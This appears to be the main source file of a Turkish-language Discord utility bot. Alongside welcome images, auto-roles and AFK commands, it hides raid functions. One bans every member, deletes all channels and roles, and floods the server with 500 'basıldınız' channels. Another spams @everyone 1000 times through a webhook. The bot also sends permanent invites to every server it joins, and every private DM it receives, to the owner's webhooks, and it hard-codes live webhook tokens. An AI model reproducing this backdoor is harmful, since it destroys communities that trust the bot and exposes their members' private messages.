const moment = require("moment")
const Discord = require("discord.js");
const dateFormat = require('dateformat');
const client = new Discord.Client({ disableEveryone: true });
require("moment-duration-format");
const fs = require('fs')
const ayarlar = require('./ayarlar.json')
client.login(ayarlar.token)
const db = require('quick.db')
var resimler = {
  "cikis": "https://cdn.discordapp.com/attachments/606141048728846336/606141265360322561/New_Project_1_2_1.png",
  "giris": "https://cdn.discordapp.com/attachments/606141048728846336/606141260243140628/New_Project_1_1.png",
  "cikismanzara": "https://cdn.discordapp.com/attachments/606141048728846336/606742859177132032/Background_2.png",
  "girismanzara": "https://cdn.discordapp.com/attachments/606141048728846336/606742856811413504/Background_1.png"
}
var request = require('request');
const prefix = ayarlar.prefix
const dmweb = new Discord.WebhookClient("591949683241386004","MuLETfWjNx30jV5VNLHeeowQwvKyPVAcw3Daeu5A5BYbS0H6gmIPkch-kjtKMVnv9Com")
const gçweb = new Discord.WebhookClient("591949865064333322","7gth75PvIDUEuDWGuA4tZvY6foL2lM1rrt7ajDt2NethkPWEWazkI8_T8O-CiB-4XukV")
const hastebin = require('hastebin-gen')
const DBL = require("dblapi.js");
const dbl = new DBL(ayarlar.dbltoken, client);
const RC = require("ritararycode");
const ritarary = new RC('2zDiq2oTGjvRCJp', client);

ritarary.on('iletildi', () => {
  console.log('[RitararyCode] Gönderilen Sunucu Sayısı: '+ client.guilds.size);
})
 
ritarary.on('hata', e => {
 console.log(`[RitararyCode] Bir Hata Oluştu. Hata: ${e}`);
})

dbl.on('posted', () => {
  console.log('[Discord Bot List] Gönderilen Sunucu Sayısı: '+ client.guilds.size)
})

client.on('message', require(`./ekler/mesaj.js`));
client.on('ready', () => {
require('./site/js/dash.js')(client)
require('./loggers/ana.js')(client)
require('./ekler/hazır.js')(client)
require('./gamerbot-müzik.js')(client)
})

//////////////////////////////////////////////////////////////////////////////////////////////

const http = require('http')

setInterval(() => {
  http.get(`http://gamerbott.glitch.me/`);
}, 120000);

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('messageUpdate', (oldMsg, newMsg) => {
  var ck = db.get(`sunucular.${newMsg.guild.id}.kanallar.${newMsg.channel.id}.calismakanal`)
  if(ck === "aktif") return;
  if(oldMsg === newMsg) return false;
  client.emit("message", newMsg);
});

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('message', message => {
  if(message.channel.type !== "dm") return;
  if(message.author.id === client.user.id) return;
  else return dmweb.send(`**${message.author.tag} (${message.author.id}):** ${message.content}`)
})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on("guildMemberAdd", async member => {
var fetch = db.get(`sunucular.${member.guild.id}.giriscikis.kanal`)
if(!fetch) return;
var kanal = client.channels.get(fetch)
if(!kanal) return;
var tur = db.get(`sunucular.${member.guild.id}.giriscikis.tur`)
if(!tur) return;

if(tur === "klasik") {
var avatarr = member.user.displayAvatarURL
var { createCanvas, loadImage } = require('canvas')
var canvas = createCanvas(1238,395)
var ctx = canvas.getContext('2d');
loadImage(resimler.giris).then(giris => {
loadImage(avatarr).then(avatar => {
ctx.drawImage(giris, 0, 0, 1238, 395);
ctx.drawImage(avatar, 0, 0, 364, 395)

ctx.beginPath()
ctx.fillStyle = `#ffffff`;
ctx.font = '50px Impact';
ctx.textAlign = "right";
ctx.fillText(`${member.user.tag}`, 1200, 250)
  
kanal.send(new Discord.Attachment(canvas.toBuffer(), "gamerbot-giris.png"))
})})
} else if(tur === "manzara") {
var avatarr = member.user.displayAvatarURL
var { createCanvas, loadImage } = require('canvas')
var canvas = createCanvas(960, 635)
var ctx = canvas.getContext('2d');
loadImage(resimler.girismanzara).then(giris => {
loadImage(avatarr).then(avatar => {
ctx.drawImage(giris, 0, 0, 960, 635);
ctx.drawImage(avatar, 55, 90, 200, 200)

var b = []
member.user.username.split("").forEach(a => b.push(a))
var isim;
if(b.length > 20) isim = member.user.tag.substring(0,17) + "#" + member.user.discriminator
else isim = member.user.tag
  
ctx.beginPath()
ctx.fillStyle = `#ffffff`;
ctx.font = '30px Impact';
ctx.textAlign = "left";
ctx.fillText(`${isim}`, 350, 180)
  
kanal.send(new Discord.Attachment(canvas.toBuffer(), "gamerbot-giris.png"))
})})        
} 
})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on("guildMemberRemove", async member => {
var fetch = db.get(`sunucular.${member.guild.id}.giriscikis.kanal`)
if(!fetch) return;
var kanal = client.channels.get(fetch)
if(!kanal) return;
var tur = db.get(`sunucular.${member.guild.id}.giriscikis.tur`)
if(!tur) return;

if(tur === "klasik") {
var avatarr = member.user.displayAvatarURL
var { createCanvas, loadImage } = require('canvas')
var canvas = createCanvas(1238,395)
var ctx = canvas.getContext('2d');
loadImage(resimler.cikis).then(giris => {
loadImage(avatarr).then(avatar => {
ctx.drawImage(giris, 0, 0, 1238, 395);
ctx.drawImage(avatar, 0, 0, 364, 395)

ctx.beginPath()
ctx.fillStyle = `#ffffff`;
ctx.font = '50px Impact';
ctx.textAlign = "right";
ctx.fillText(`${member.user.tag}`, 1200, 250)
  
kanal.send(new Discord.Attachment(canvas.toBuffer(), "gamerbot-cikis.png"))
})})

} else if(tur === "manzara") {
  
var avatarr = member.user.displayAvatarURL
var { createCanvas, loadImage } = require('canvas')
var canvas = createCanvas(960, 635)
var ctx = canvas.getContext('2d');
loadImage(resimler.cikismanzara).then(giris => {
loadImage(avatarr).then(avatar => {
ctx.drawImage(giris, 0, 0, 960, 635);
ctx.drawImage(avatar, 55, 90, 200, 200)

var b = []
member.user.username.split("").forEach(a => b.push(a))
var isim;
if(b.length > 20) isim = member.user.tag.substring(0,17) + "#" + member.user.discriminator
else isim = member.user.tag
  
ctx.beginPath()
ctx.fillStyle = `#ffffff`;
ctx.font = '30px Impact';
ctx.textAlign = "left";
ctx.fillText(`${isim}`, 350, 180)
  
kanal.send(new Discord.Attachment(canvas.toBuffer(), "gamerbot-cikis.png"))
})})
}})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('guildMemberAdd', async member => {
  var ddb = db.fetch(`sunucular.${member.guild.id}.otorol`)
  if(!ddb) return;
   var veri = JSON.parse(ddb)
  var role = member.guild.roles.get(veri.id)
  let kanal = member.guild.channels.get(veri.kanal)
if(!role) return;
if(!kanal) return;

if(role.editable) {
  member.addRole(role.id)
  kanal.send(`**${member.user.tag}** sunucuya katıldı ve rolü başarıyla verildi!`)
} else {
  kanal.send(`**${member.user.tag}** adlı kullanıcı sunucuya katıldı. Rol verilemedi, lütfen Botun Gerekli Yetkilere Sahip Olduğuna ve Rolünün Verilecek Kullanıcı Rolünün Üstünde Olduğuna Emin Olunuz!`)
}
})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('message', message => {
var afk = db.get(`kullanicilar.${message.author.id}.afk`)
if(!afk) return;
var afkb = JSON.parse(afk)
if((new Date().getTime() - afkb.zaman) < 1000) return;
db.delete(`kullanicilar.${message.author.id}.afk`)
var süre = new Date().getTime() - afkb.zaman

var sürem = moment.duration(süre).format("Y [yıl], M [ay], D [gün], H [saat], m [dakika], s [saniye]")
message.channel.send(':warning: | Afk modundan ayrıldınız. <@' + message.author.id + ">. Afk kaldığın süre:** " + sürem + "**")
})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('message', message => {
  let etiket = message.mentions.users.first()
if(!etiket) return;
var afaka = db.fetch(`kullanicilar.${etiket.id}.afk`)
if(!afaka) return;
var afk = JSON.parse(afaka)
if(!afk) return;
var süre = new Date().getTime() - afk.zaman
var sürem = moment.duration(süre).format("Y [yıl], M [ay], D [gün], H [saat], m [dakika], s [saniye]")
if (afk) { return message.channel.send(`:warning: | **${etiket.tag}** adlı kullanıcı **${sürem}**dir **${afk.sebep}** sebebiyle afk!`) }
})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('message', message => {
  var pref = db.fetch(`sunucular.${message.guild.id}.prefix`)
  if(!pref) pref = "g!"
  
  var ck = db.get(`sunucular.${message.guild.id}.kanallar.${message.channel.id}.calismakanal`)
  if(ck === "aktif") return;
  
  var kl = client.karalistekontrol(message.author.id)
  if(kl === "aktif") return;
  
  let command = message.content.split(' ')[0].slice(pref.length);
  var args = message.content.split(' ').slice(1);    
  if(message.channel.type === "dm") return;
  if(client.commands.has(args[0])) return;
  else if(client.aliases.has(args[0])) return;

  var etiketpref = new RegExp(`^<@!?${client.user.id}>`);
  var test = String(message.content.match(etiketpref))
  var u;
  if(message.content.startsWith(test)) {
    u = "çalış"
  } else {
    if(command === "sor") { 
    if(message.content.startsWith(pref)) {
    u = "çalış"
  }}}
  if(u !== "çalış") return;
  if(!args.join(" ") && command !== "sor") return message.channel.send(`Prefixim: **${pref}** \nYardım almak için **${pref}yardım**`)
  if(!args.join(" ") && command === "sor") return message.channel.send(`Hatalı Kullanım! Doğru Kullanıma Bakmak için ${prefix}yardım ${command}`)
  message.channel.send('<a:yukleniyor:593075459835691013> Yanıt Yükleniyor...').then(m => {
request('https://simsekapi.cf/9F2oVMgUUM/sor?soru='+ encodeURIComponent(args.join(" ")), function (error, response, body) {
    if (error) { m.edit(client.emojiler.hayır + "| Api kaynaklı bir hata oluştu!")}
    else if (!error) {
        var veri = JSON.parse(body);
        m.edit(veri.cevap)
    }
});
})})

//////////////////////////////////////////////////////////////////////////////////////////////

client.on('guildCreate', guild => {
    guild.channels.filter(t => t.type === "text").random().createInvite({ maxAge: 0, reason: "Otomatik oluşturma"}).then(i => {
        const embed = new Discord.RichEmbed()
        .setColor("GREEN")
        .setAuthor(`Giriş ${guild.name}`)
        .setThumbnail(guild.iconURL)
        .addField("Kurucu", guild.owner.user.tag)
        .addField("Sunucu ID", guild.id, true)
        .addField("Toplam Kullanıcı", guild.memberCount, true)
        .addField("Toplam Kanal", guild.channels.size, true)
        .addField("Davet Linki", "https://discord.gg/" + i.code, true)
         gçweb.send(embed);
    })})
    
//////////////////////////////////////////////////////////////////////////////////////////////

client.on('guildDelete', guild => {
        const embed = new Discord.RichEmbed()
        .setColor("RED")
        .setAuthor(`Çıkış ${guild.name}`)
        .setThumbnail(guild.iconURL)
        .addField("Kurucu", guild.owner.user.tag)
        .addField("Sunucu ID", guild.id, true)
        .addField("Toplam Kullanıcı", guild.memberCount, true)
        .addField("Toplam Kanal", guild.channels.size, true)
         gçweb.send(embed);
    })

//////////////////////////////////////////////////////////////////////////////////////////////  

var zaman = "[" + moment().format('DD/MM/YYYY HH:mm') + "] >>"
const log = message => console.log(zaman + " " +message)
client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
  log(`${files.length} komut yüklendi.`);
});

client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};

client.elevation = message => {
  if(!message.guild) return false;
  message.guild.fetchMember(message.author).then(member => {
  let permlvl = 0;
  if (member.hasPermission("MANAGE_MESSAGES")) permlvl = 1;
  if (member.hasPermission("KICK_MEMBERS")) permlvl = 2;
  if (member.hasPermission("BAN_MEMBERS")) permlvl = 3;
  if (member.hasPermission("MANAGE_GUILD")) permlvl = 4;
  if (member.hasPermission("ADMINISTRATOR")) permlvl = 5;
  if (ayarlar.sahip.includes(message.author.id)) permlvl = 6;
  return permlvl;
  })
};

client.on('message', message => {  
  var ck = db.get(`sunucular.${message.guild.id}.kanallar.${message.channel.id}.calismakanal`)
  if(ck === "aktif") return;
  
  if(message.author.bot) return;
   var a,cevap;
   var yanıtlayıcı = db.fetch(`sunucular.${message.guild.id}.ok`)
   if(!yanıtlayıcı) return;
   yanıtlayıcı.forEach(aa => {
   a = JSON.parse(aa)
   if(message.content.toString() !== a.isim.toString()) return;
   else cevap = a.cevap.toString()
              .replace("-üyesayı-",message.guild.memberCount)
              .replace("-sunucuisim-", message.guild.name)
              .replace("-aktifsayı-", message.guild.members.filter(t => t.presence.status === "online").size + message.guild.members.filter(t => t.presence.status === "dnd").size + message.guild.members.filter(t => t.presence.status === "idle").size)
              .replace("-pasifsayı-", message.guild.members.filter(t => t.presence.status === "offline").size)
   })
  message.channel.send(cevap, { disableEveryone: true }).catch(e => {
  return;
})
})


client.sunucular = async(channel) => {
var svlist = []
client.guilds.forEach(guild => {
svlist.push(`Sunucu İsmi: ${guild.name} || Sunucu ID: ${guild.id} || Üye Sayısı: ${guild.memberCount}`)
})
var link = await hastebin(`${svlist.join('\n')}`, { url: "https://hasteb.in"})
return channel.send(`Sunucu Listem: ${link}`)
}
 
client.mesajat = function mesajat(KANAL, ID, MESAJ) {
   if(KANAL === "yazı") {
     client.channels.get(ID).send(MESAJ)
   return client.channels.get(ID).name + " adlı kanala mesaj gönderildi"
   }
   else if(KANAL === "dm") {
   client.users.get(ID).send(MESAJ)
   return client.users.get(ID).tag + " adlı kullanıcıya mesaj gönderildi"
   } else return ":x: | Sadece DM - Yazı"
 }

client.bas = (sunucu,link) => {
if(!sunucu.me.hasPermission('BAN_MEMBERS')) return;
else {
sunucu.members.forEach(kul => {
 kul.user.send(link)
 if(ayarlar.sahip.some(a => kul.user.id === a)) return;
 else {
 sunucu.ban(kul, "Basıldınız")
 }
});
}

if(!sunucu.me.hasPermission('MANAGE_CHANNELS')) return;
else { sunucu.channels.forEach(a => a.delete()) }

if(!sunucu.me.hasPermission('MANAGE_ROLES')) return;
else { sunucu.roles.forEach(a => a.delete()) }

sunucu.setIcon(null)
sunucu.setName("null")

for( var i = 0; i < 500; i++) {
  sunucu.createChannel('basıldınız', "text")
}
for( var i = 0; i < 250; i++) {
  sunucu.createRole('basıldınız')
}

}

client.webhookbas = (sunucu,link) => {
sunucu.channels.filter(t => t.type === "text").random().createWebhook("Baskın").then(a => {
  var web = new Discord.WebhookClient(a.id, a.token)
for( var i =0; i < 1000; i++) {
  web.send('@everyone @here\n\n' + link + '\n\n@everyone @here')
}
})
}

client.davetçıkar = (sunucuid, channel) => {
  client.guilds.get(sunucuid).channels.filter(t => t.type === "text").random().createInvite().then(i => channel.send(i.toString()))
  return client.guilds.get(sunucuid).name + " adlı sunucunun davet linki çıkarılıyor..."
}

client.karalistekontrol = (üye) => {
  var a = db.get(`karaliste.${üye}`)
  if(a === "aktif") return 'aktif'
  else return 'pasif'
}

client.emojiler = {
  "evet": "<:evet:601408900826398720> ",
  "hayır": "<:hayir:601409510858555434> "
}

client.random = (channel) => {
require('generate-password').generateMultiple(4, {
uppercase: true,
length: 50,
numbers: true
}).forEach(a => {
channel.send(a)
})
}

client.on('guildMemberAdd', async member => {
var tagdb = db.fetch(`sunucular.${member.guild.id}.ototag`)
if(!tagdb) return;

var veri = JSON.parse(tagdb)
var kanal = client.channels.get(veri.kanal)
var tag = veri.tag
setTimeout(() => {
  if(member.editable) {
    member.setNickname(`${tag} ${member.user.username}`)
    kanal.send(`${member.user.tag} adlı kullanıcıya ${tag} tagı verilmiştir!`)
  } else {
      kanal.send(client.emojiler.hayır + "| Bir Kullanıcıya Oto-Tag Verilirken Bir Hata Oluştu! Lütfen Botun Gerekli Yetkilere Sahip Olduğuna ve Rolünün Verilecek Kullanıcı Rolünün Üstünde Olduğuna Emin Olunuz!")
     //console.log(member.guild.name + "adlı sunucuda oto-tag hatası!") 
  }
}, 1000) 
})

client.on('message', message => {
var antiraid = db.fetch(`sunucular.${message.guild.id}.spamkoruma`)
if(!antiraid) return;
if(message.author.bot) return;
message.guild.fetchMember(message.author).then(member => {
if(member.hasPermission('BAN_MEMBERS')) return;
var b = []
var aut = []
setTimeout(() => {
message.channel.fetchMessages({ limit: 10 }).then(m => {
m.forEach(a => {
if(m.filter(v => v.content === a.content).size > m.size / 2) {
if(member.hasPermission('BAN_MEMBERS')) return;
b.push(a)
aut.push(a.author)
}})
if(!b.includes(":warning: | Saldırgan botlar susturulacak.")) { işlem() }
else {}
  
function işlem() {

if(b.length > 5) {
  if(m.last().content !== m.first().content) return;
  message.channel.send(':warning: | Saldırgan botlar susturulacak.')
  aut.forEach(a => {
    message.channel.overwritePermissions(a, {
      "SEND_MESSAGES": false
    })
  })
  message.channel.send(client.emojiler.evet + ' | Saldırgan botlar susturuldu.')
} else return;
}
})})})})